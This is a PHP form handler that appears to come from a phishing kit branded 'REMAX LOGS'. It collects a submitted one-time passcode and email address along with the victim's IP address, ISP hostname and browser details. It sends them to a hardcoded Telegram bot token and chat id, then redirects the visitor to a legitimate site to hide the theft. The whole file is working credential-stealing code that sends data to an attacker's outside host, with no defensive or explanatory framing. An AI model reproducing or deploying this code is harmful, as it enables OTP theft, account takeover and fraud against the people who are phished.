<?php
// Allow access from any origin
header("Access-Control-Allow-Origin: *");

// Get form data
$OTP = $_POST['txtotp'] ?? '';
$username = $_POST['email_address'] ?? '';

// Get IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get ISP hostname
$hostname = gethostbyaddr($ip);

// Get user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Construct the message
$message = "Form Submission Details  🌹REMAX🔐LOGS\n\n";
$message .= "OTP Notification: $OTP\n\n";
$message .= "Sender IP Address: $ip\n";
$message .= "ISP Hostname: $hostname\n";
$message .= "User Agent: $userAgent\n\n";

// Save form data to text file

// Email details
$to = '';
$subject = 'Form Submission - $ip';
$headers = 'From: your_email@example.com';

// Send email
//$mailSent = mail($to, $subject, $message, $headers);

// Telegram API credentials
$telegramToken = '6395656830:AAEy6yKcW3nrDGIGKE26uFaoSCbXLR63UcU';
$chatId = '6526373855';

// Check if Telegram API credentials are provided
if (!empty($telegramToken) && !empty($chatId)) {
    // Send message to Telegram
    $telegramMessage = $message;
    $telegramApiUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $telegramQueryParams = http_build_query(['chat_id' => $chatId, 'text' => $telegramMessage]);
    $telegramUrl = "$telegramApiUrl?$telegramQueryParams";
    $telegramResponse = file_get_contents($telegramUrl);
}

if (true) {
    header("Location: https://www.paperlesspost.com/");
    echo 'success';
} else {
    echo 'error';
}
?>
